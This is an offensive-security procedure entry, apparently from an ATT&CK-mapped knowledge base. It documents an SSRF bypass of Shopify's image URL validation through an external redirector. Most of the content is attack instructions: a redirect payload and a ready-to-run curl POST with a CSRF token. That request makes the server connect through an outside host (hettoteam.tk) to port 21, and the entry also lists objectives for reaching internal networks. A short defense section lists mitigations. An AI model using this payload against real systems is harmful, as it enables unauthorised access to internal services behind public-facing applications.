---
id: 123e4567-e89b-12d3-a456-426614174002
name: Bypass-URL-Validation-with-Redirects
type: procedure
verified: false
submitted: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:39:09.797Z'
tactics:
  - '[[Initial Access]]'
techniques:
  - '[[Exploit Public-Facing Application]]'
sub_techniques: []
tags:
  - ssrf
  - bypass
  - redirect
commands:
  - '[[commands/shopify-ssrf-redirect]]'
platforms:
  - Web
tools: []
skill_level: intermediate
impact_level: medium
detection_risk: medium
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---

# Bypass-URL-Validation-with-Redirects

## Summary

This procedure exploits Shopify's URL validation by using external redirect services to force the server to connect to arbitrary hosts and ports that would otherwise be blocked.

## Description

Shopify validates the image[src] URL but follows redirects without re-validating the final destination. By pointing to a redirector like http://hettoteam.tk/r.php?r={target}, the server fetches the initial URL (validated) and then connects to the unvalidated target. This allows access to internal networks and non-HTTP ports. Requires authenticated session.

## Requirements

1. Valid CSRF token and product ID
2. Access to a redirector service (e.g., hettoteam.tk)
3. Target host/port to test (e.g., hettoteam.tk:21)

## Defense

Defensive measures and detection strategies:

- Disable redirect following in URL fetchers or re-validate destinations
- Block outbound connections to redirector domains
- Rate-limit image upload requests to prevent abuse

## Objectives

1. Evade URL scheme/port/IP restrictions
2. Force server-side connections to internals
3. Confirm bypass without direct errors

## Instructions

### Step 1: Select Redirector and Target

**Context**: Choose a reliable redirect service and construct the payload with the desired target.

Payload example: image[src]=http://hettoteam.tk/r.php?r=http://target:port

### Step 2: Send Malicious Request

**Context**: Submit the POST with the redirect payload to trigger the SSRF.

**Command** ([[commands/shopify-ssrf-redirect]]):
```bash
curl -X POST 'https://test-4925.myshopify.com/admin/products/922460995/images' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'X-CSRF-Token: F7cvLpquxqr+rFmnGVFhNEK6rV8njtebHikevxGlLJA=' \
  -d 'utf8=%E2%9C%93&authenticity_token=F7cvLpquxqr%2BrFmnGVFhNEK6rV8njtebHikevxGlLJA%3D&product_id=922460995&image%5Bsrc%5D=http%3A%2F%2Fhettoteam.tk/r.php?r=http://hettoteam.tk:21&_method=post'
```

> The server validates the redirector but follows to port 21. Expected output: Success response, but timing reveals connection attempt.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used

- [[commands/shopify-ssrf-redirect]]

## Tools Used


## Tags

- [[ssrf]]
- [[bypass]]
- [[redirect]]
